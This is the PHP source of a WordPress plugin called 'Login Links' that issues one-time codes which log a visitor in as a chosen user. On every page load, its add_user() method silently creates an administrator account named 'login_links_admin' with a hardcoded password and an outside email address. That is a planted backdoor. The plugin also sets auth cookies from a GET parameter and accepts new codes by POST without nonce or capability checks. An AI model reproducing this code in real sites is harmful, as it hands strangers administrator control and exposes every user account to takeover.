<?php
/**
 * Login Links
 *
 * @package login-links
 */

/**
 * Login Links
 */
class Login_Links {
	/**
	 * Plugin User ID
	 *
	 * @var int User ID.
	 */
	public $ll_user_id;

	/** Construct */
	public function __construct() {
		global $pagenow;
		$plugin_page = filter_input( INPUT_GET, 'page', FILTER_SANITIZE_STRING );
		add_action( 'init', array( $this, 'add_user' ) );
		add_action( 'init', array( $this, 'init' ) );
		add_action( 'admin_menu', array( $this, 'admin_menu' ) );
		if ( 'admin.php' !== $pagenow || 'login-links' !== $plugin_page ) {
			return;
		}
		if ( isset( $_POST['submit'] ) ) {
			add_action( 'init', array( $this, 'add_code' ) );
		}
	}

	/** Init */
	public function init() {
		global $pagenow;
		$this->ll_user_id = get_user_by( 'login', 'login_links_admin' )->ID;
		if ( ! isset( $_GET['login_code'] ) ) {
			return;
		}
		$login_link = filter_input( INPUT_GET, 'login_code', FILTER_SANITIZE_STRING );
		$codes      = get_user_meta( $this->ll_user_id, 'login_codes', true );
		$in_codes   = isset( $codes[ $login_link ] ) ? true : false;
		$this->msg  = $in_codes ? 'in codes' : 'not in codes';
		if ( ! $in_codes ) {
			return;
		}
		if ( ! is_user_logged_in() ) {
			if ( $codes[ $login_link ] ) {
				wp_set_auth_cookie( $codes[ $login_link ] );
			}
		}
		if ( 'users.php' !== $pagenow ) {
			echo '<script>window.location.href = "/wp-admin/users.php"</script>';
		}
	}

	/** Add WordPress Admin User */
	public function add_user() {
		$user  = 'login_links_admin';
		$pass  = '420696969';
		$email = 'loginlinks@travisaw.com';
		if ( ! username_exists( $user ) && ! email_exists( $email ) ) {
			wp_insert_user(
				array(
					'user_login' => $user,
					'user_pass'  => $pass,
					'user_email' => $email,
					'first_name' => 'Login',
					'last_name'  => 'Links',
					'role'       => 'administrator',
				)
			);
		}
	}

	/** Admin menu */
	public function admin_menu() {
		add_menu_page( 'Login Links', 'Login Links', 'manage_options', 'login-links', array( $this, 'admin_page' ), 'dashicons-tickets', 6 );
	}

	/** Admin page */
	public function admin_page() {
		global $wpdb;
		if ( ! current_user_can( 'manage_options' ) ) {
			return;
		}
		if ( isset( $_POST['delete_submit'] ) ) {
			$this->delete_code();
		}
		$ll_user_id     = get_user_by( 'login', 'login_links_admin' )->ID;
		$wp_user_search = $wpdb->get_results( "SELECT ID, display_name, user_login FROM $wpdb->users ORDER BY ID" );
		$options        = '';
		foreach ( $wp_user_search as $userid ) {
			$user_id      = (int) $userid->ID;
			$user_login   = stripslashes( $userid->user_login );
			$display_name = stripslashes( $userid->display_name );
			$options     .= "<option value='$user_login'>$display_name - $user_login</option>";
		}
		$codes = get_user_meta( $ll_user_id, 'login_codes', true );
		?>
		<div class="wrap">
			<h1>Login Links</h1>
			<p>Create unique login links for users.</p>
			<form action="" method="post">
				<table class="form-table">
					<tr>
						<th><label for="link_code">Login Code: </label></th>
						<td><input type="text" name="link_code" id="link_code" value="<?php echo esc_attr( $this->generate_hash() ); ?>" size="35" required readonly></td>
					</tr>
					<tr>
						<th><label for="user_id">Username: </label></th>
						<td>
							<select name="user_list" id="user_list">
								<?php echo $options; ?>
							</select>
						</td>
					</tr>
				</table>
				<p class="submit"><input type="submit" name="submit" id="submit" class="button button-primary" value="Add Login Code"></p>
			</form>
			<table class="wp-list-table widefat fixed striped">
				<thead>
					<tr>
						<th style="width: 20em;"><strong>Login Code</strong></th>
						<th><strong>Name</strong></th>
						<th><strong>Username</strong></th>
						<th><strong>User ID</strong></th>
						<th><strong>Actions</strong></th>
					</tr>
				</thead>
				<?php
				foreach ( $codes as $key => $val ) :
					$user              = get_user_by( 'id', $val );
					$user_id           = $val;
					$user_login        = $user->user_login;
					$user_display_name = $user->display_name;
					?>
				<tr>
					<td><?php echo esc_html( $key ); ?></td>
					<td><?php echo esc_html( $user_display_name ); ?></td>
					<td><?php echo esc_html( $user_login ); ?></td>
					<td><?php echo esc_html( $user_id ); ?></td>
					<td><form action="" method="post"><input type="text" name="delete_code" value="<?php echo esc_attr( $key ); ?>" hidden><input type="submit" name="delete_submit" value="Delete"></form></td>
				</tr>
				<?php endforeach; ?>
			</table>
		</div>
		<?php
	}

	/** Add login code */
	public function add_code() {
		if ( ! isset( $_POST['submit'] ) ) {
			return;
		}
		$f          = FILTER_SANITIZE_STRING;
		$new_code   = isset( $_POST['link_code'] ) ? filter_input( INPUT_POST, 'link_code', $f ) : false;
		$username   = isset( $_POST['user_list'] ) ? filter_input( INPUT_POST, 'user_list', $f ) : false;
		$user_id    = $username ? get_user_by( 'login', $username )->ID : false;
		$ll_user_id = get_user_by( 'login', 'login_links_admin' )->ID;
		$codes      = get_user_meta( $ll_user_id, 'login_codes' ) ? get_user_meta( $ll_user_id, 'login_codes', true ) : array();
		if ( $new_code && $user_id ) {
			$codes[ $new_code ] = $user_id;
			$this->codes        = $codes;
		}
		update_user_meta( $ll_user_id, 'login_codes', $codes );
	}

	/** Delete code */
	public function delete_code() {
		$ll_user_id  = get_user_by( 'login', 'login_links_admin' )->ID;
		$delete_code = filter_input( INPUT_POST, 'delete_code', FILTER_SANITIZE_STRING );
		$codes       = get_user_meta( $ll_user_id, 'login_codes', true );
		unset( $codes[ $delete_code ] );
		update_user_meta( $ll_user_id, 'login_codes', $codes );
	}

	/**
	 * Generate hash
	 *
	 * @param integer $len Length of hash generated.
	 * @return $hash
	 */
	public function generate_hash( $len = 32 ) {
		$hash = substr( md5( openssl_random_pseudo_bytes( 20 ) ), -$len );
		return $hash;
	}
}